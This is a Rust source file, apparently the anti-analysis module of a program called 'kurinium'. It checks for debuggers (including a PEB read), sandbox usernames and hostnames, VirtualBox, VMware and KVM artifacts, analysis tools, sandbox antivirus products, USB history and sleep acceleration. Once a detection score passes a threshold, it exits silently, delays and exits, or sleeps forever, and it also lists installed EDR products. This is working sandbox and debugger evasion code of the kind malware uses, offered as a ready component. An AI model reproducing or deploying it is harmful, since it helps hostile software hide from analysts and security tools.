#![allow(dead_code)]

use std::path::Path;
use std::time::Duration;

use windows::core::w;
use windows::Win32::Foundation::POINT;
use windows::Win32::Storage::FileSystem::GetDiskFreeSpaceExW;
use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
use windows::Win32::System::SystemInformation::{GetTickCount64, GlobalMemoryStatusEx, MEMORYSTATUSEX};
use windows::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, SM_REMOTESESSION, GetCursorPos};
use windows::Win32::Graphics::Gdi::{GetDC, GetDeviceCaps, VREFRESH, ReleaseDC};
use windows::Win32::NetworkManagement::IpHelper::{GetAdaptersInfo, IP_ADAPTER_INFO};
use windows::Win32::System::Registry::{
    RegOpenKeyExW, RegQueryInfoKeyW, RegCloseKey, 
    HKEY_LOCAL_MACHINE, KEY_READ, HKEY,
};

use crate::utils::cpuid::CpuId;
use crate::core::exit_patcher::safe_exit;

// Debug-only file logging for anti analysis
#[cfg(debug_assertions)]
fn aa_log(msg: &str) {
    use std::io::Write;
    let log_path = std::env::temp_dir().join("kurinium_aa.log");
    if let Ok(mut file) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&log_path) 
    {
        let timestamp = chrono::Local::now().format("%H:%M:%S%.3f");
        let _ = writeln!(file, "[{}] {}", timestamp, msg);
    }
}

#[cfg(not(debug_assertions))]
fn aa_log(_msg: &str) {
    // No-op in release builds
}

macro_rules! aa_log {
    ($($arg:tt)*) => {
        aa_log(&format!($($arg)*))
    };
}

// Evasion actions when analysis detected
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum EvasionAction {
    ExitSilently,
    DelayThenExit,
    ReportOnly,
    InfiniteSleep,
}

pub struct AntiAnalysisConfig {
    pub min_score_threshold: u32,
    pub action: EvasionAction,
    pub delay_range: (u64, u64),
    pub startup_delay: bool,
}

impl Default for AntiAnalysisConfig {
    fn default() -> Self {
        Self {
            min_score_threshold: 50,
            action: EvasionAction::DelayThenExit,
            delay_range: (30, 120),
            startup_delay: true,
        }
    }
}

#[derive(Debug, Clone, Default)]
pub struct DetectionItem {
    pub category: String,
    pub reason: String,
    pub weight: u32,
}

#[derive(Debug, Clone, Default)]
pub struct DetectionResult {
    pub total_score: u32,
    pub is_detected: bool,
    pub detections: Vec<DetectionItem>,
}

fn add_detection(result: &mut DetectionResult, category: &str, reason: &str, weight: u32) {
    result.detections.push(DetectionItem {
        category: category.to_string(),
        reason: reason.to_string(),
        weight,
    });
    result.total_score += weight;
}

pub fn random_delay(range: (u64, u64)) {
    use std::time::{SystemTime, UNIX_EPOCH};
    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or(Duration::ZERO)
        .as_nanos() as u64;
    let delay_secs = range.0 + (seed % (range.1 - range.0 + 1));
    std::thread::sleep(Duration::from_secs(delay_secs));
}

fn run_check<F>(result: &mut DetectionResult, name: &str, check_fn: F) 
where F: FnOnce(&mut DetectionResult) 
{
    let before = result.total_score;
    check_fn(result);
    let after = result.total_score;
    
    if after > before {
        aa_log!("{} [FAIL +{}]", name, after - before);
    } else {
        aa_log!("{} [PASS]", name);
    }
}

pub fn run_checks(config: &AntiAnalysisConfig) -> DetectionResult {
    let mut result = DetectionResult::default();
    aa_log!("Running checks...");

    if config.startup_delay {
        let jitter = (std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or(Duration::ZERO)
            .as_millis() % 2000) as u64 + 1000;
        aa_log!("Startup delay: {}ms", jitter);
        std::thread::sleep(Duration::from_millis(jitter));
    }

    aa_log!("Quick checks==========");
    run_check(&mut result, "Debugger", check_debugger);
    run_check(&mut result, "Username", check_username);
    run_check(&mut result, "Uptime", check_uptime);
    
    if result.total_score >= config.min_score_threshold {
        aa_log!("Early exit - Score: {}/{}", result.total_score, config.min_score_threshold);
        result.is_detected = true;
        return result;
    }

    aa_log!("Hardware/Environment checks==========");
    run_check(&mut result, "System specs", check_specs);
    run_check(&mut result, "CPU", check_cpu);
    run_check(&mut result, "Network/MAC", check_network);
    run_check(&mut result, "USB history", check_usb_history);
    run_check(&mut result, "Display", check_display);
    
    if result.total_score >= config.min_score_threshold {
        aa_log!("Early exit - Score: {}/{}", result.total_score, config.min_score_threshold);
        result.is_detected = true;
        return result;
    }

    aa_log!("VM artifacts checks==========");
    run_check(&mut result, "VM files", check_vm_files);
    run_check(&mut result, "VM registry", check_vm_registry);
    run_check(&mut result, "Processes", check_processes);
    run_check(&mut result, "Antivirus", check_antivirus);
    
    aa_log!("Timing attack checks==========");
    run_check(&mut result, "Timing attack", check_timing);

    result.is_detected = result.total_score >= config.min_score_threshold;
    aa_log!("Complete - Score: {}/{} - {}", 
        result.total_score, 
        config.min_score_threshold,
        if result.is_detected { "DETECTED" } else { "CLEAN" }
    );
    result
}

pub fn run_and_evade(config: &AntiAnalysisConfig) -> bool {
    let result = run_checks(config);

    if result.is_detected {
        match config.action {
            EvasionAction::ExitSilently => safe_exit(0),
            EvasionAction::DelayThenExit => {
                random_delay(config.delay_range);
                safe_exit(0);
            }
            EvasionAction::InfiniteSleep => loop {
                std::thread::sleep(Duration::from_secs(3600));
            },
            EvasionAction::ReportOnly => return true,
        }
    }
    false
}

fn check_debugger(result: &mut DetectionResult) {
    if unsafe { IsDebuggerPresent().as_bool() } {
        add_detection(result, "Debugger", "IsDebuggerPresent", 100);
    }

    #[cfg(target_arch = "x86_64")]
    unsafe {
        let peb: *const u8;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
        if !peb.is_null() {
            let being_debugged = *peb.add(2);
            if being_debugged != 0 {
                add_detection(result, "Debugger", "PEB BeingDebugged", 100);
            }
        }
    }
}

fn check_mouse(result: &mut DetectionResult) {
    unsafe {
        let mut p1 = POINT::default();
        let mut p2 = POINT::default();
        
        if GetCursorPos(&mut p1).is_ok() {
            std::thread::sleep(Duration::from_millis(500));
            if GetCursorPos(&mut p2).is_ok() {
                if p1.x == p2.x && p1.y == p2.y {
                    add_detection(result, "Interaction", "No mouse movement", 25);
                }
            }
        }
    }
}

fn check_input_idle(result: &mut DetectionResult) {
    unsafe {
        let mut positions: Vec<(i32, i32)> = Vec::new();
        
        for _ in 0..3 {
            let mut pt = POINT::default();
            if GetCursorPos(&mut pt).is_ok() {
                positions.push((pt.x, pt.y));
            }
            std::thread::sleep(Duration::from_millis(500));
        }
        
        if positions.len() >= 3 {
            let all_same = positions.windows(2).all(|w| w[0] == w[1]);
            if all_same {
                add_detection(result, "Interaction", "Cursor completely static", 30);
            }
        }
    }
}

fn check_username(result: &mut DetectionResult) {
    if let Ok(user) = std::env::var(obfstr::obfstr!("USERNAME")) {
        let lower = user.to_lowercase();
        
        let blacklist = [
            "sandbox", "virus", "malware", "test",
            "currentuser", "username", "john", "emily", "george", 
            "bruno", "dekker", "willcarter", "miller", "johnson",
            "hong lee", "joe blow", "john doe", "hans gruber", "hal9th",
        ];
        
        for &name in &blacklist {
            if lower == name || lower.contains(name) {
                add_detection(result, "User", &format!("Suspicious username: {}", user), 60);
                break;
            }
        }
    }
    
    if let Ok(host) = std::env::var(obfstr::obfstr!("COMPUTERNAME")) {
        let lower = host.to_lowercase();
        let blacklist = ["sandbox", "user-pc", "malware", "virus", "analysis"];
        
        for &name in &blacklist {
            if lower.contains(name) {
                add_detection(result, "User", &format!("Suspicious hostname: {}", host), 40);
                break;
            }
        }
    }
}

fn check_uptime(result: &mut DetectionResult) {
    unsafe {
        let tick = GetTickCount64();
        let minutes = tick / 60000;
        
        if minutes < 5 {
            add_detection(result, "Timing", "System uptime < 5 min", 40);
        }
        
        let days = tick / (1000 * 60 * 60 * 24);
        if days > 30 {
            add_detection(result, "Timing", &format!("Uptime {} days (snapshot?)", days), 30);
        }
    }
}

fn check_specs(result: &mut DetectionResult) {
    unsafe {
        let mut mem = MEMORYSTATUSEX::default();
        mem.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
        if GlobalMemoryStatusEx(&mut mem).is_ok() {
            let gb = mem.ullTotalPhys as f64 / (1024.0 * 1024.0 * 1024.0);
            if gb < 3.5 {
                add_detection(result, "Specs", &format!("Low RAM: {:.1} GB", gb), 50);
            }
        }
    }
    unsafe {
        let mut total: u64 = 0;
        if GetDiskFreeSpaceExW(w!("C:\\"), None, Some(&mut total), None).is_ok() {
            let gb = total / (1024 * 1024 * 1024);
            if gb < 60 {
                add_detection(result, "Specs", &format!("Small disk: {} GB", gb), 40);
            }
        }
    }
}

fn check_cpu(result: &mut DetectionResult) {
    let cpu = CpuId::get();
    
    if cpu.cores < 2 {
        add_detection(result, "Hardware", &format!("Only {} core(s)", cpu.cores), 80);
    }
    
    let brand = cpu.brand.to_lowercase();
    
    if (brand.contains("i7") || brand.contains("ryzen 7")) && cpu.cores < 4 {
        add_detection(result, "Hardware", "CPU brand/core mismatch", 90);
    }
}

fn check_display(result: &mut DetectionResult) {
    unsafe {
        let hdc = GetDC(None);
        let refresh = GetDeviceCaps(Some(hdc), VREFRESH);
        ReleaseDC(None, hdc);
        
        if refresh > 0 && refresh < 30 {
            add_detection(result, "Display", &format!("Low refresh: {} Hz", refresh), 30);
        }
    }    
    unsafe {
        if GetSystemMetrics(SM_REMOTESESSION) != 0 {
            add_detection(result, "Display", "RDP session detected", 60);
        }
    }
}

fn check_network(result: &mut DetectionResult) {
    let mut size: u32 = 15000;
    let mut buf: Vec<u8> = vec![0; size as usize];
    
    let mut detected_vbox = false;
    let mut detected_kvm = false;
    
    unsafe {
        if GetAdaptersInfo(Some(buf.as_mut_ptr() as *mut IP_ADAPTER_INFO), &mut size) == 0 {
            let mut ptr = buf.as_ptr() as *const IP_ADAPTER_INFO;
            while !ptr.is_null() {
                let adapter = *ptr;
                let mac = &adapter.Address[0..3];
                match (mac[0], mac[1], mac[2]) {
                    (0x08, 0x00, 0x27) => {
                        if !detected_vbox {
                            add_detection(result, "Network", "VirtualBox MAC", 80);
                            detected_vbox = true;
                        }
                    }
                    (0x52, 0x54, 0x00) => {
                        if !detected_kvm {
                            add_detection(result, "Network", "KVM/QEMU MAC", 80);
                            detected_kvm = true;
                        }
                    }
                    _ => {}
                }
                
                ptr = adapter.Next;
            }
        }
    }
}

fn check_usb_history(result: &mut DetectionResult) {
    unsafe {
        let mut hkey: HKEY = HKEY::default();
        let key = windows::core::HSTRING::from(r"SYSTEM\CurrentControlSet\Enum\USBSTOR");
        
        if RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            windows::core::PCWSTR::from_raw(key.as_ptr()),
            Some(0),
            KEY_READ,
            &mut hkey
        ).is_ok() {
            let mut count: u32 = 0;
            let _ = RegQueryInfoKeyW(hkey, None, None, None, Some(&mut count), 
                None, None, None, None, None, None, None);
            
            if count == 0 {
                add_detection(result, "Environment", "No USB storage history", 35);
            }
            
            let _ = RegCloseKey(hkey);
        }
    }
}

fn check_vm_files(result: &mut DetectionResult) {
    let vm_files = [
        // VirtualBox
        (r"C:\Windows\System32\drivers\VBoxMouse.sys", "VirtualBox"),
        (r"C:\Windows\System32\drivers\VBoxGuest.sys", "VirtualBox"),
        (r"C:\Windows\System32\vboxservice.exe", "VirtualBox"),
        (r"C:\Windows\System32\vboxtray.exe", "VirtualBox"),
        // VMware
        (r"C:\Windows\System32\drivers\vmmouse.sys", "VMware"),
        (r"C:\Windows\System32\drivers\vmhgfs.sys", "VMware"),
        (r"C:\Windows\System32\drivers\vmci.sys", "VMware"),
    ];
    
    for (path, vm) in vm_files {
        if Path::new(path).exists() {
            add_detection(result, "VM", &format!("{} file found", vm), 90);
            return;
        }
    }
}

fn check_vm_registry(result: &mut DetectionResult) {
    let vm_keys = [
        (r"SOFTWARE\Oracle\VirtualBox Guest Additions", "VirtualBox"),
        (r"SOFTWARE\VMware, Inc.\VMware Tools", "VMware"),
        (r"SOFTWARE\Wine", "Wine"),
        (r"HARDWARE\ACPI\DSDT\VBOX__", "VirtualBox"),
        (r"HARDWARE\ACPI\FADT\VBOX__", "VirtualBox"),
    ];
    
    for (key, vm) in vm_keys {
        unsafe {
            let mut hkey: HKEY = HKEY::default();
            let wide = windows::core::HSTRING::from(key);
            
            if RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                windows::core::PCWSTR::from_raw(wide.as_ptr()),
                Some(0),
                KEY_READ,
                &mut hkey
            ).is_ok() {
                let _ = RegCloseKey(hkey);
                add_detection(result, "VM", &format!("{} registry key", vm), 90);
                return;
            }
        }
    }
}

fn check_processes(result: &mut DetectionResult) {
    let procs = crate::utils::syscall::get_filtered_process_names();
    
    // Analysis tools
    let analysis = [
        "wireshark.exe", "fiddler.exe", "x64dbg.exe", "x32dbg.exe",
        "ollydbg.exe", "ida.exe", "ida64.exe", "ghidra.exe",
        "processhacker.exe", "procmon.exe", "procexp.exe",
        "regmon.exe", "filemon.exe", "autoruns.exe",
        "tcpview.exe", "dumpcap.exe", "httpdebugger.exe",
        "resourcehacker.exe", "peid.exe", "lordpe.exe",
        "frida.exe", "cheatengine.exe"
    ];
    
    // VM processes
    let vm_procs = [
        "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
        "vboxservice.exe", "vboxtray.exe", "vgauthservice.exe",
        "qemu-ga.exe", "prl_tools.exe", "prl_cc.exe",
        "xenservice.exe", "vmsrvc.exe", "vmusrvc.exe"
    ];
    
    for p in &procs {
        let lower = p.to_lowercase();
        
        for &tool in &analysis {
            if lower == tool {
                add_detection(result, "Process", &format!("Analysis tool: {}", p), 60);
            }
        }
        
        for &vm in &vm_procs {
            if lower == vm {
                add_detection(result, "Process", &format!("VM process: {}", p), 80);
            }
        }
    }
    
    if procs.len() < 40 {
        add_detection(result, "Process", &format!("Low process count: {}", procs.len()), 25);
    }
}

fn check_timing(result: &mut DetectionResult) {
    let start = std::time::Instant::now();
    std::thread::sleep(Duration::from_millis(500));
    let elapsed = start.elapsed().as_millis();
    
    if elapsed < 400 {
        add_detection(result, "Timing", "Sleep acceleration detected", 100);
    }
}

pub fn get_installed_antivirus() -> Vec<String> {
    use std::collections::HashMap;
    use wmi::{COMLibrary, Variant, WMIConnection};
    
    let com = match COMLibrary::new() {
        Ok(c) => c,
        Err(_) => return Vec::new(),
    };
    
    let wmi = match WMIConnection::with_namespace_path("root\\SecurityCenter2", com) {
        Ok(w) => w,
        Err(_) => return Vec::new(),
    };
    
    let query = "SELECT displayName FROM AntiVirusProduct";
    let results: Vec<HashMap<String, Variant>> = match wmi.raw_query(query) {
        Ok(r) => r,
        Err(_) => return Vec::new(),
    };
    
    results.iter()
        .filter_map(|av| {
            if let Some(Variant::String(name)) = av.get("displayName") {
                Some(name.clone())
            } else {
                None
            }
        })
        .collect()
}

fn check_antivirus(result: &mut DetectionResult) {
    let avs = get_installed_antivirus();
    
    let sandbox_avs = [
        "windows defender", // Usually ok, but check others
        "cuckoo",
        "joe sandbox",
        "any.run",
        "hybrid analysis",
        "virustotal",
        "sandbox",
    ];
    
    let edr_products = [
        "crowdstrike",
        "carbon black",
        "sentinel",
        "cylance",
        "sophos",
        "mcafee",
        "kaspersky",
        "bitdefender",
        "eset",
        "malwarebytes",
        "norton",
        "avast",
        "avg",
        "trend micro",
        "f-secure",
        "panda",
        "comodo",
        "webroot",
    ];
    
    for av in &avs {
        let lower = av.to_lowercase();
        
        for sandbox in &sandbox_avs {
            if lower.contains(sandbox) && *sandbox != "windows defender" {
                add_detection(result, "AV", &format!("Sandbox AV detected: {}", av), 60);
            }
        }
        
        for edr in &edr_products {
            if lower.contains(edr) {
                aa_log!("EDR detected: {}", av);
            }
        }
    }
    
    if avs.is_empty() {
        add_detection(result, "AV", "No antivirus installed", 15);
    }
}
